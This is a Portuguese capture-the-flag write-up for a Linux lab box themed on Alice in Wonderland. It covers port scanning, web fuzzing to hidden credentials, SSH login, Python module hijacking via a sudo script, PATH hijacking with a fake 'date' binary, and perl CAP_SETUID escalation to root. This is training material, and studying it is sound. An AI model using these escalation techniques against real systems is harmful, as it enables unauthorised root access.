#Difficult : Medium #OS : Linux
***
## Port scan
Começo fazendo a enumeração das postas para saber qual a superfície de ataque.
```sh
nmap 10.10.x.x -sC -sV -Pn -A -oN scan_tcp
```
![[Pasted image 20250523195620.png]]
## Web Fuzzing
Temo um site rodando.
```http
http://10.10.x.x
```
![[Pasted image 20250523200401.png]]

```sh
ffuf -u http://10.10.x.x/FUZZ -w /usr/share/Discovery/Web-Content/big.txt
```
![[Pasted image 20250523200339.png]]

Em `/img` temos as imagens do site, em `/poem` temos um poema, e em `/r` temo uma mensagem interessante.
```http
http://10.10.x.x/r
```
![[Pasted image 20250523200739.png]]

Então refiz o `fuzzing` até chegar em `http://10.10.x.x/r/a/b`, a partir desse ponto já tinha entendido que seria `10.0.x.x/r/a/b/b/i/t`.
```http
http://10.0.x.x/r/a/b/b/i/t
```
![[Pasted image 20250523201000.png]]

Ao chegar nessa página verifiquei o conteúdo `html` da página.
![[Pasted image 20250523201129.png]]
## Lateral Movement
Temos então um usuário e uma credencial. Podemos fazer login no `ssh` com essas credenciais.
```sh
ssh alice@10.10.x.x
```
![[Pasted image 20250523201525.png]]

Podemos então ver quais comandos podemos executar como outro usuário.
```sh
sudo -l
```
![[Pasted image 20250523201910.png]]

Primeiro vejo qual conteúdo do `script`, e qual possibilidades temos.
```sh
cat ./walrus_and_the_carpenter.py
```
![[Pasted image 20250523203728.png]]
![[Pasted image 20250523203751.png]]

Ele faz a importação do módulo random, podemos criar um arquivo com esse mesmo nome, assim ele fará a importação do nosso arquivo.
```python
from os import system
system("/bin/bash")
```
![[Pasted image 20250523204409.png]]
## root
Perfeito, conseguimos personificar o usuário `rabbit`, como não tenho sua senha, não podemos ver os comandos que podem ser utilizados como outro usuário. Então apenas enumerei a `home` desse usuário. Temos um `script` que pertence ao `root`.

Na saída desse comando temos uma `string` semelhante a saída do comando `date`.
![[Pasted image 20250523205000.png]]

Para confirmar isso vou criar um script em `/tmp` de nome `date`.
```sh
vim /tmp/date
```
![[Pasted image 20250526073745.png]]
```sh
chmod +x /tmp/date
export PATH=/tmp:$PATH
```

Após a execução, conseguimos nos tornar o usuário `hatter`.
![[Pasted image 20250526074012.png]]

Na pasta `home` deste usuário temos sua senha, podemos usar para logar como `hatter`, pois nosso `gid` ainda está como o do `rabbit`.
![[Pasted image 20250526075225.png]]

Fiz uma enumeração básica e encontrei alguns binários com capabilities que podemos explorar.
![[Pasted image 20250526075605.png]]

Os dois binários de `perl` também pertencem ao nosso grupo, o que significa que podemos executa-lo. No [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) temos uma forma de escalar privilégio com a capabilitie `CAP_SETUID`. Após a execução, podemos ir a pasta `home` de `alice` e pegar a `flag` de `root`.
![[Pasted image 20250526080133.png]]
***
![[Pasted image 20250526080420.png]]